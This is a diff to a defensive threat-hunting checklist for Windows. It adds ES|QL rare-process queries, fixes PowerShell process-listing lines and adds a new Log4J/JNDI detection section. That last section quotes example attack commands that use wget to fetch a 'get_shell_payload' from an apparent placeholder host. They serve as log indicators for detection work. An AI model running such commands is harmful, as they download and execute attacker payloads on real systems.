@@ -100,6 +100,7 @@
 6. Use ```eventvwr.msc``` with Sysmon Event logs and Event ID 20. 
 7. Look for MOF files within ```C:\Windows\System32\wbem\AutoRecover``` or ```C:\Windows\System32\wbem\mofcomp.exe```. 
 8. Look for MOF files in registry ```HKLM\SOFTWARE\Microsoft\Wbem\CIMON```. 
+9. Look for non-standard processes within Elastic ES|QL with: ```FROM logs-* | Where process.name IS NOT NULL | stats count=count(process.name) by process.name, host.hostname | Where count < 5 | stats rare_process_count = COUNT_DISTINCT(process.name), processes = VALUES(process.name) by host.hostname| SORT rare_process_count DESC| Keep host.hostname,rare_process_count, processes```
 
 # Examine RDP Connections [T1563.002](https://attack.mitre.org/techniques/T1563/002/)[T1210](https://attack.mitre.org/techniques/T1210/)
 1. Use ```eventvwr.msc``` with Windows Security Event logs event ID 4648. 
@@ -225,6 +226,7 @@
 31. Look at processes within Powershell with ```Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize```. 
 32. Use Eric Zimmermans Amcache parser in Powershell. 
 33. Look at Typed Paths within ```NTUSER.dat\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths```. 
+34. Look for non-standard processes within Elastic ES|QL with: ```FROM logs-* | Where process.name IS NOT NULL | stats count=count(process.name) by process.name, host.hostname | Where count < 5 | stats rare_process_count = COUNT_DISTINCT(process.name), processes = VALUES(process.name) by host.hostname| SORT rare_process_count DESC| Keep host.hostname,rare_process_count, processes```
 
 # Examine the Shimcache/Amcache
 1. View the AppCompatCache to determine time of execution and name of executable at ```SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache```. 
@@ -331,7 +333,8 @@
 24. Examine prefetch files with [w10pf_parse.py](https://github.com/DavidCruciani/tools/blob/master/win10_prefetch/w10pf_parse.py). 
 25. Examine Windows Defender Logs with Event ID 1117 within the Channel Microsoft-Windows-Windows Defender/Operational. 
 26. Run the following command in PowerShell on the system: ```Get-NetTCPConnection | select Local*, Remote*, State, OwningProcess,` @{n="ProcName";e={(Get-Process -Id $_.OwningProcess).ProcessName}},` @{n="ProcPath";e={(Get-Process -Id $_.OwningProcess).Path}} | sort State | ft -Auto ```. 
-27. Look at processes within Powershell with ```Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize```
+27. Look at processes within Powershell with ```Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize```. 
+28. Look for non-standard processes within Elastic ES|QL with: ```FROM logs-* | Where process.name IS NOT NULL | stats count=count(process.name) by process.name, host.hostname | Where count < 5 | stats rare_process_count = COUNT_DISTINCT(process.name), processes = VALUES(process.name) by host.hostname| SORT rare_process_count DESC| Keep host.hostname,rare_process_count, processes```
 
 # Explore Registry Activity [T1564.001](https://attack.mitre.org/techniques/T1564/001) [T1574](https://attack.mitre.org/techniques/T1574)[T1112](https://attack.mitre.org/techniques/T1112)[T1070.007](https://attack.mitre.org/techniques/T1070/007) [T1070.009](https://attack.mitre.org/techniques/T1070/009)[T1003.002](https://attack.mitre.org/techniques/T1003/002)[T1027.011](https://attack.mitre.org/techniques/T1027/011)[T1137](https://attack.mitre.org/techniques/T1137)[T1012](https://attack.mitre.org/techniques/T1012) [T1033](https://attack.mitre.org/techniques/T1033) [T1569.002](https://attack.mitre.org/techniques/T1569/002) [T1552.002](https://attack.mitre.org/techniques/T1552/002)
 1. Use ```procmon``` within SysInternals
@@ -385,7 +388,8 @@ Notification Packages```, or ```HKLM\SYSTEM\CurrentControlSet\Control\NetworkPro
 11. Use ```eventvwr.msc``` with Sysmon Event logs and Event ID 8. 
 12. Use [Live Forensicator](https://github.com/Johnng007/Live-Forensicator) with ```.\Forensicator -EVTX EVTX``` and identify processes within processes.html. 
 13. Run the following command in PowerShell on the system: ```Get-NetTCPConnection | select Local*, Remote*, State, OwningProcess,` @{n="ProcName";e={(Get-Process -Id $_.OwningProcess).ProcessName}},` @{n="ProcPath";e={(Get-Process -Id $_.OwningProcess).Path}} | sort State | ft -Auto ```. 
-14. Look at processes within Powershell with ```Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize```
+14. Look at processes within Powershell with ```Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize```. 
+15. Look for non-standard processes within Elastic ES|QL with: ```FROM logs-* | Where process.name IS NOT NULL | stats count=count(process.name) by process.name, host.hostname | Where count < 5 | stats rare_process_count = COUNT_DISTINCT(process.name), processes = VALUES(process.name) by host.hostname| SORT rare_process_count DESC| Keep host.hostname,rare_process_count, processes```
 
 # Explore File Read Activity [No TTP]
 1. Use ```procmon``` within SysInternals
@@ -748,3 +752,6 @@ Notification Packages```, or ```HKLM\SYSTEM\CurrentControlSet\Control\NetworkPro
 
 # Identify Proxy Usage [T1090](https://attack.mitre.org/techniques/T1090/)
 1. Look for registry interactions with ```HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp```. 
+
+# Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
+1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 
